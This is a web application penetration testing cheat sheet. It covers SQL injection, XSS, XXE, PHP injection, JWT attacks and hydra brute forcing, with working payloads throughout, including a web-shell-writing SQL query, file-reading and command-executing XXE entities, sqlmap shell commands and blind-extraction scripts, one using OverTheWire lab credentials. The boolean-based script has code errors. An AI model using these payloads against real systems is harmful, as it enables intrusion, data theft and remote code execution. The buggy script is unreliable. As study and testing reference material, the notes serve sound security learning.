---
layout: page
title: Web App
permalink: /web/
---

# Index

* [Authentication](#authentication)
* [SQL Injection](#sql-injection)
* [Cross Site Scripting](#cross-site-scripting)
* [PHP Injection](#php-injection)
* [Template Injection](#template-injection)
* [XML External Entity](#xml-external-entity)
* [Deserialization](#deserialization)
* [Insecure Direct Object Reference](#insecure-direct-object-reference)
* [Insecure Communication](#insecure-communication)
* [Storage](#storage)
* [HTTP Parameter Polution](#http-parameter-polution)
* [JSON Web Tokens](#json-web-tokens)
* [Important Web Security Concepts](#important-web-security-concepts)
* [Other Tools](#other-tools)
* [Methodology](#methodology)


## Authentication

### Brute Forcing Online

`hydra`

For example attacking a web login form

```
hydra 192.168.1.69 http-form-post "form_login.php:user=^USER^&pass=^PASS^:Bad login" -L users.txt -P pass.txt -o hydra-http-post-attack.txt
```

Or a get form with cookies

```
hydra 192.168.0.11 -l admin -P /usr/share/set/src/fasttrack/wordlist.txt http-get-form “dvwa/vulnerabilities/brute/index.php:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: security=Low;PHPSESSID=eogppved743ckngeo0so6tnp87"
```

### SSL/TLS

SSL/TLS are protocols used for encrypting information between two points.

The SSL Handshake is Asymmetric and the sending of data uses symmetric encryption.

The handshake protocol is:

1. The client sends the SSL versions and ciphers it can use to the server
2. Server selects a compatible version and cipher, then sends it's certificate + public key
3. Client checks the certificate & then generates a pre-master key, encrypts it with the servers public key and sends it back
4. Server decrypts the pre-master secret with it's private key, and then the client AND server both perform the same steps on the pre-master key to generate the *shared secret*
5. Client and server exchange messages to test the shared secret and say that all future communications will be encrypted with it.

### OpenSSL

OpenSSL is a versatile command line tool that can be used for a large variety of tasks related to Public Key Infrastructure (PKI) and HTTPS (HTTP over TLS). 

https://www.digitalocean.com/community/tutorials/openssl-essentials-working-with-ssl-certificates-private-keys-and-csrs

CSR: Certificate Signing Request -> A combination of a public key + information about a certificate (company, location, FQDN, etc)

SSL Certificate: Generated using a CSR + private key

---

## SQL Injection

SQL injection attack consists of insertion of a SQL query via the input data from the client to the application.

Suppose a SQL query like below, where parameters are received from user input

```SQL
SELECT id FROM users WHERE username='$username' AND password='$password';
```

If we managed to input data like below we could return unintended data.

```SQL
SELECT username FROM users WHERE username='' or '1'='1' AND password='' or '1'='1'
```

We can also save a request in burp and feed it into `sqlmap` or fuzz with `sqlmap` directly.

```
sqlmap
# sqlmap crawl  
sqlmap -u http://10.10.10.10 --crawl=1

# sqlmap dump sql database from saved request
sqlmap -r login.req --dbms=mysql --dump

# sqlmap web shell  
sqlmap -r login.req --os-shell

# sqlmap reverse shell
sqlmap -r login.req --os-pwn
```

SQL Injection Writing a file

```SQL
union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/inetpub/wwwroot/backdoor.php'
```

SQL Injection Reading a File

```SQL
union all select 1,2,3,4,load_file("c:/windows/system32/drivers/etc/hosts"),6
```

### Login Bypass

SQL Logon Bypass Fuzzing Strings

```SQL
' or 1=1 LIMIT 1 --
' or 1=1 LIMIT 1 -- -
' or 1=1 LIMIT 1#
'or 1#
' or 1=1 --
' or 1=1 -- -
```

### Data Extraction

If we can perform SQL Injection and are returned the outputs one table we can use, *UNION*, *JOIN*, or *statement chaining i.e: ;*

The Union operator can only be used if the original/new queries have the same structure (number and data type of columns), we query this before extracting our data.

We inject 'order by x' to determine the number of columns, it will error out once we exceed the number of rows in the initial query.

```SQL
' ORDER BY 1,2,..9 ---
```

Then we union select the appropriate number of columns. We exploit the fact that NULL is compatible with all datatypes. This won't work in oracle databases as every *SELECT* statement must include a *FROM* in which case we select from the globally accessible table *DUAL*

```SQL
' UNION SELECT NULL,NULL,NULL,NULL --
```

Then we try to find a column with a compatible data type, usually string/varchar.

```SQL
' UNION SELECT 'a',NULL,NULL,NULL --
' UNION SELECT NULL,'a',NULL,NULL --
' UNION SELECT NULL,NULL,'a',NULL --
' UNION SELECT NULL,NULL,NULL,'a' --
```

Now we try to finger Database type + version.

```
MySQL: SELECT version()
MS SQL: SELECT @@version
PostgreSQL: SELECT version()
Oracle: SELECT version FROM v$instance or SELECT FROM PRODUCT_COMPONENT_VERSION
```

```SQL
' UNION SELECT @@version,NULL,NULL,NULL --
```

If we can't use the version strings we can try to work it out other ways, for example examining error messages or using a boolean query.

```
MySQL: CONCAT('a','b')
MS SQL: 'a' + 'b'
PostgreSQL: 'a' || 'b'
Oracle: CONCAT('a','b') or 'a' || 'b'
```

In practice

```SQL
' 'AB' = CONCAT('a','b')
```

Next we need to determine the table names. We do this by querying either the *user_objects* table, which defines user created objects, the *all_user_objects* table which defines all the objects the user can see or the *information_schema.tables*/*all_tables*.

```SQL
' UNION SELECT object_name, object_type, NULL, NULL from user_objects --
' UNION SELECT object_name, object_type, NULL, NULL from all_user_objects --
' UNION SELECT table_name,NULL,NULL,NULL from information_schema.tables -- #MySQL, MS SQL, and PostgreSQL
' UNION SELECT table_name,NULL,NULL,NULL from all_tables -- #ORACLE
```

Next we need to determine the column names. We do this by querying the *user_tab_columns* table or the *information_schema.columns*

```SQL
' UNION SELECT column_name, NULL, NULL, NULL FROM user_tab_columns WHERE table_name = 'USERS' --
' UNION SELECT column_name, NULL, NULL, NULL FROM user_tab_columns WHERE table_name = 'USERS' --
' union select column_name,2 from information_schema.columns where table_name = 'users' -- #mysql
```

Once we have the column and table names we can extract the desired data.

```SQL
' UNION SELECT names, NULL, NULL, NULL FROM 'USERS' --
```


### Boolean Based

If in an injectable application returns a different response depending on whether a query returns TRUE or FALSE then we can use that response to determine values in the database.

Assume an injectable URL

https://exampleurl.com/login.php?id=1'
If 
https://exampleurl.com/login.php?id=1' AND 1=0
Is different to
https://exampleurl.com/login.php?id=1' AND 1=1
Then we can essentially brute force databases values out one character at a time using queries like SUBSTRING, strcmp, LIKE BINARY, etc
https://exampleurl.com/login.php?id=1' AND ASCII(SUBSTRING(username,1,1)) = 97 AND '1' = '1'

We would write a script like

```
import requests

url = 'https://exampleurl.com/login.php?id=1''
alphas  = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
name = ''

for i in range(0,32):
    for char in alphas:
        sql = "' AND ASCII(SUBSTRING(username," + i + ",1)) = " + name + char + " AND '1' = '1' --"
        r= requests.post(url + sql)
        if 'exists' in r.text:
            passwd += char
            print(passwd)
            break
```

Assuming a 32 length max username, could be refined to check length + for null character so no need for hardcoded max, to filter for characters in string before determining their place to speed up, etc.

### Time Based

Time-based SQL Injection is an inferential SQL Injection technique that relies on sending an SQL query to the database which forces the database to wait for a specified amount of time before responding. The response time will indicate to the attacker whether the result of the query is TRUE or FALSE. Again it only returns boolean values so we would script like

```python
import requests

user = 'natas17'
password = '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'
url = 'http://natas17.natas.labs.overthewire.org/index.php'
alphas  = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
passwd = ''

for i in range(0,32):
    for char in alphas:
        sql = {'username' : 'natas17" and password LIKE BINARY "' + passwd + char  + '%" and sleep(5) -- '}
        r= requests.post(url, auth=(user, password), data=sql)
        if (r.elapsed.seconds >= 10):
            passwd += char
            print(passwd)
            break
```

### Out of Band 

Out-of-band SQL Injection occurs when an attacker is unable to use the same channel to launch the attack and gather results, instead they use an out of band channel, often a ping, DNS or HTTP request depending on whether a query is true or false.


## Cross Site Scripting XSS

XSS is the injection of client-side scripts into web pages viewed by other users. 

If we can inject XSS into a page, then we can redirect a user to server we control and grab their cookies for that page.

If the httponly flag is set on the cookies this tells the browser that only the server can access them, never the client. This means we can't dump the cookies as above. However with XSS we can still perform whatever actions the user can perform as the user without their control or consent.

We can also inject a beefsuite hook that allows use to perform many XSS feats, activate webcams, etc.

Test for wherever user input is reflect in the site with:

``` Javascript
    <h1>Test<h1>
    <script>alert('x')</script>
    <iframe src=javascript:alert(1)>
    <img src=x onerror=alert(1)>
```

Browsers often have XSS filters, but can be bypassed with iframes etc.

### Reflected

Reflected Cross-site Scripting (XSS) occur when an attacker injects browser executable code within a single HTTP response. The injected attack is not stored within the application itself; it is non-persistent and only impacts users who open a maliciously crafted link or third-party web page. The attack string is included as part of the crafted URI or HTTP parameters, improperly processed by the application, and returned to the victim.

### DOM

DOM-based Cross-Site Scripting is the de-facto name for XSS bugs which are the result of active browser-side content on a page, typically JavaScript, obtaining user input and then doing something unsafe with it which leads to execution of injected code.

### Mitigation

The basic premise of defending against XSS is output encoding any untrusted input that goes to the screen. If in doubt, treat everything (even data you populated in your DB as untrusted). Encode as the data is sent to the browser (not in your persisted data). In the case of Single Page Apps (SPA’s), you will need to encode in the client.

Encode as HTML Entities in HTML Body

Encode as HTML Entities in HTML Attribute

Encode for javascript if outputting user input to javascript (this is a dangerous practice though).

---

## Cross Site Request Forgery (CSRF)

If a user is logged into a website (has an active session/token) and at the same times accesses a malicious website then a CSRF attack can occur.

The malicious website is designed to submit a request to the website the user is logged in to without the user being aware.
Since the request will have the session cookie/token attached to it the website believes the request is valid and actions accordingly.

The referral header is sometimes used to try and minimize the risk of this attack, although it introduces issues with adblockers and anonymity plugins and features of browsers.

Ideally on the website that hosts the form a CSRF Token is assigned whenever a form is requested. Then when the form is submitted the token is attached. These should be unique and impossible to guess, so that when the malicious site attempts a request with the users cookies the CSRF doesn't match and nothing happens.

*But I only have JSON APIs and no CORS enabled, how can those be susceptible to CSRF?*

The only way for a browser to make a JSON content type request is through XHR. Before the browser can make such a request a preflight request will be made towards the server (remember the CSRF request will be cross origin). If the pre-flight response does not allow the cross origin request the browser will not make the call. However there have been bypasses to this in the past and it is bad practice.


---

## PHP Injection

If we can inject the below string anywhere interpreted as php we get RCE.

`<?php system($_GET['cmd']); ?>`

If there is LFI the below might work

`site.php?lfi_path=php://input%00`

Other things to try https://websec.wordpress.com/2010/02/22/exploiting-php-file-inclusion-overview/

---

## Template Injection

Template Injection occurs when user input is embedded in a template in an unsafe manner. Various website use templates to construct pages, these have a syntax that can be escaped. Client Side Template Injection and Server Side Template Injection exist.

Can lead to full RCE as the templates are operated on by server side languages.

Test for with

```
{7*7}
```

---

## XML External Entity

An XML External Entity attack is a type of attack against an application that parses XML input. This attack occurs when XML input containing a reference to an external entity is processed by a weakly configured XML parser.

Local file inclusion

```XML
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<creds>
    <user>&xxe;</user>
    <pass>mypass</pass>
</creds>
```

Remote code exectuion

```XML
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>
<creds>
    <user>&xxe;</user>
    <pass>mypass</pass>
</creds>
```
Above is just proof of concept, other functions exist.

---

## Deserialization

Deserialization of untrusted data (user input) can escape whatever is parsing the data and sometimes perform code execution, include additional data, etc.

---

## Insecure Direct Object Referenece

Insecure Direct Object Referenece (IDOR) is where an application uses client-provided input to access data and objects AND this input is not properly handled allowing authorization bypasses/disclosure of private data.

---

## Insecure Communication

If a website transmite private data insecurely (i.e. not using https) anyone *on the wire* can listen in. A simple proof of concept, say a website posts a form submission to an endpoint. Set up wireshark, set a display filter of `http.request.method=="POST"` and capture in plaintext the form data.
                         
---

## Storage

HTML is a stateless protocol so continuity is achieved through storage.

### Cookies

Stores data that has to be sent back to the server with subsequent requests. Its expiration varies based on the type and the expiration duration can be set from either server-side or client-side (normally from server-side).
Cookies are primarily for server-side reading (can also be read on client-side), localStorage and sessionStorage can only be read on client-side.
Cookies can be made secure by setting the httpOnly flag as true for that cookie. This prevents client-side access to that cookie

### Local Storage

Stores data with no expiration date, and gets cleared only through JavaScript, or clearing the Browser cache / Locally Stored Data. Large storage capacity. Data is never natively sent to the server, can be achieved with JS.

### Session Storage

The sessionStorage object stores data only for a session, meaning that the data is stored until the browser (or tab) is closed.
Data is never natively transferred to the server, can be achieved with JS.

---

## HTTP Parameter Polution

Supplying multiple HTTP parameters with the same name may cause an application to interpret values in unanticipated ways. Or slighty changing names, or order or values.

Test with curl against apis etc

---

## JSON Web Tokens

JSON Web Token (JWT) is an open standard (RFC 7519) that defines a compact
and self-contained way for securely transmitting
information between parties as a JSON object. This information can be
verified and trusted because it is digitally signed. JWTs can be signed using
a secret (with the HMAC algorithm) or a public/private key pair using RSA.

JSON Web Token is used to carry information related to the identity and
characteristics (claims) of a client. This "container" is signed by the server
in order to avoid that a client tamper it in order to change, for example,
the identity or any characteristics (example: change the role from simple
user to admin or change the client login). This token is created during
authentication (is provided in case of successful authentication) and is
verified by the server before any processing. It is used by an application
to allow a client to present a token representing his "identity card" (container
with all user information about him) to server and allow the server to verify
the validity and integrity of the token in a secure way, all of this in a stateless
and portable approach (portable in the way that client and server technologies can
be different including also the transport channel even if HTTP is the most often used)

### JWT Structure

```
xxxxx.yyyyy.zzzzz
header.payload.signature
```

#### Header

The header states the type of token and algorithm to use. It is then base64 encoded.

```
{
  "alg": "HS256",
  "typ": "JWT"
}
```

#### Payload

The payload contrains the claims,  claims are statements about an entity (typically, the user) and additional data. The payload is then Base64Url encoded.

```
{
  "sub": "1234567890",
  "name": "John Doe",
  "admin": true
}
```

#### Signature

To create the signature part you have to take the encoded header, the encoded payload, a secret, the algorithm specified in the header, and sign that. For example if you want to use the HMAC SHA256 algorithm, the signature will be created in the following way:

```
HMACSHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),
  secret)
```

The signature is used to verify the message wasn't changed along the way, and, in the case of tokens signed with a private key, it can also verify that the sender of the JWT is who it says it is.

### Attacks

1. Change the alg to "none", remove the signature entirely but leave the trailing . , edit the payload as desired
2. Crack the hash and resign

```
hashcat -m 16500 jwt_hash /usr/share/wordlists/rockyou.txt
```
Can use python to create new tokens
```python
>>> import jwt
>>> encoded = jwt.encode({'some': 'payload'}, 'secret', algorithm='HS256')
    'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzb21lIjoicGF5bG9hZCJ9.4twFt5NiznN84AWoo1d7KO1T_yoc0Z6XOpOVswacPZg'
>>> jwt.decode(encoded, 'secret', algorithms=['HS256'])
{'some': 'payload'}
```

### Authenticating

If we try to access a url and it returns this message, it means we can not access it without the relevant JWT.
```
{"success":false,"message":"Auth token is not supplied"}
```
If we have creds we can try, we can request a token using curl
```
curl -H "Content-Type: application/json" -X POST -d '{"username":"admin","password":"adminpassword"}' http://10.10.10.10:3000/login
```
Then we can pass the return token in the Authorization header to access the resource.

```
curl -X GET -H 'Authorization: Bearer (token)' http://10.10.10.10:3000/
```
---


## Important Web Security Concepts

### Same Origin Policiy

Same Origin Policy permits scripts contained in a first web page to access data in a second web page, but only if both web pages have the same origin. An origin is defined as a combination of URI scheme, host name, and port number. This is a ket security concept that prevents a malicious script on one page from obtaining access to sensitive data on another web page.

### httponly

HttpOnly is an additional flag included in a Set-Cookie HTTP response header. Using the HttpOnly flag when generating a cookie helps mitigate the risk of client side script accessing the protected cookie. 

### Cross-Origin Resource Sharing (CORS)

CORS is a mechanism that uses additional HTTP headers to tell a browser to let a web application running at one origin to access selected resources from a server at a different origin. 

### Security.txt

Websites often define channels for responsible disclosure in a security.txt or /.well-known/security.txt
https://securitytxt.org/

### Content Type

When editing and fuzzing with forms/endpoints make sure to change the content type of submissions/posts/put to match the data we are submitting or else it will likely error out.

---

## Other Tools

* w3af - Web Application Scanner
* wpscan - Scan wordpress
* droopscan - scan Drupal & Silverstripe CMS
* cewl - Scraping for strings

## Methodology

See:
* The Web Application Hacker's Handbook - Chapter 21
* https://jdow.io/blog/2018/03/18/web-application-penetration-testing-methodology/
